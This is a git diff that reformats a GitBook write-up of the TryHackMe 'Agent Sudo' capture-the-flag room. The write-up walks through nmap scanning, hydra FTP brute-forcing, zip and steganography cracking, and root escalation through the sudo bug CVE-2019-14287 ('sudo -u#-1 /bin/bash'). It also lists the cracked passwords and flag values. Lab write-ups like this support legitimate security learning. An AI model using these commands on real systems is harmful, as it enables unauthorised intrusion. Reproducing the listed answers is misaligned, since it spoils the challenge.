@@ -1,12 +1,12 @@
 ---
-description: 'https://tryhackme.com/room/agentsudoctf'
+description: https://tryhackme.com/room/agentsudoctf
 ---
 
 # Agent Sudo
 
 ## INIT
 
-```text
+```
 export agentsudo=10.10.172.140
 ping $agentsudo
 
@@ -15,13 +15,13 @@ echo "10.10.172.140 agentsudo.thm" >> /etc/hosts
 
 ## Task 2 Enumerate
 
-```text
+```
 nmap -v -sC -sV -O -T5 -p1-65535 agentsudo.thm
 ```
 
 ### How many open ports?
 
-![](../.gitbook/assets/image%20%28451%29.png)
+![](<../.gitbook/assets/image (431).png>)
 
 {% hint style="success" %}
 3
@@ -29,11 +29,11 @@ nmap -v -sC -sV -O -T5 -p1-65535 agentsudo.thm
 
 ### How you redirect yourself to a secret page?
 
-![](../.gitbook/assets/image%20%28438%29.png)
+![](<../.gitbook/assets/image (430).png>)
 
 > Switch User-Agent to C
 
-![](../.gitbook/assets/image%20%28401%29.png)
+![](<../.gitbook/assets/image (432).png>)
 
 {% hint style="success" %}
 User-Agent
@@ -49,46 +49,46 @@ Chris
 
 ### FTP password
 
-```text
+```
 hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://agentsudo.thm -t 50
 ```
 
-![](../.gitbook/assets/image%20%28406%29.png)
+![](<../.gitbook/assets/image (433).png>)
 
 {% hint style="success" %}
 crystal
 {% endhint %}
 
-### Zip file password 
+### Zip file password&#x20;
 
-![](../.gitbook/assets/image%20%28389%29.png)
+![](<../.gitbook/assets/image (434).png>)
 
-```text
+```
 binwalk -e cutie.png
 
 zip2john 8702.zip > ziphash.txt
 john ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![](../.gitbook/assets/image%20%28381%29.png)
+![](<../.gitbook/assets/image (436).png>)
 
 {% hint style="success" %}
 alien
 {% endhint %}
 
-### steg password 
+### steg password&#x20;
 
-```text
+```
 steghide extract -sf cute-alien.jpg
 ```
 
-![](../.gitbook/assets/image%20%28422%29.png)
+![](<../.gitbook/assets/image (437).png>)
 
 {% hint style="success" %}
 Area51
 {% endhint %}
 
-### Who is the other agent \(in full name\)? 
+### Who is the other agent (in full name)?&#x20;
 
 {% hint style="success" %}
 james
@@ -104,7 +104,7 @@ hackerrules!
 
 ### What is the user flag?
 
-![](../.gitbook/assets/image%20%28404%29.png)
+![](<../.gitbook/assets/image (438).png>)
 
 {% hint style="success" %}
 b03d975e8c92a7c04146cfa7a5a313c7
@@ -112,11 +112,11 @@ b03d975e8c92a7c04146cfa7a5a313c7
 
 ### What is the incident of the photo called?
 
-```text
+```
 scp james@agentsudo.thm:/home/james/Alien_autospy.jpg .
 ```
 
-![](../.gitbook/assets/image%20%28407%29.png)
+![](<../.gitbook/assets/image (439).png>)
 
 {% hint style="success" %}
 Roswell Alien Autopsy
@@ -124,25 +124,25 @@ Roswell Alien Autopsy
 
 ## Task 5 Privilege escalation
 
-```text
+```
 sudo -l
 ```
 
-![](../.gitbook/assets/image%20%28437%29.png)
+![](<../.gitbook/assets/image (441).png>)
 
-### CVE number for the escalation 
+### CVE number for the escalation&#x20;
 
-![](../.gitbook/assets/image%20%28383%29.png)
+![](<../.gitbook/assets/image (442).png>)
 
-![](../.gitbook/assets/image%20%28442%29.png)
+![](<../.gitbook/assets/image (440).png>)
 
 {% hint style="success" %}
 CVE-2019-14287
 {% endhint %}
 
-### What is the root flag? 
+### What is the root flag?&#x20;
 
-```text
+```
 sudo -u#-1 /bin/bash
 cat /root/root.txt
 ```
@@ -151,11 +151,10 @@ cat /root/root.txt
 b53a02f55b57d4439e3341834d70c062
 {% endhint %}
 
-### \(Bonus\) Who is Agent R?
+### (Bonus) Who is Agent R?
 
-![](../.gitbook/assets/image%20%28396%29.png)
+![](<../.gitbook/assets/image (444).png>)
 
 {% hint style="success" %}
 DesKel
 {% endhint %}
-
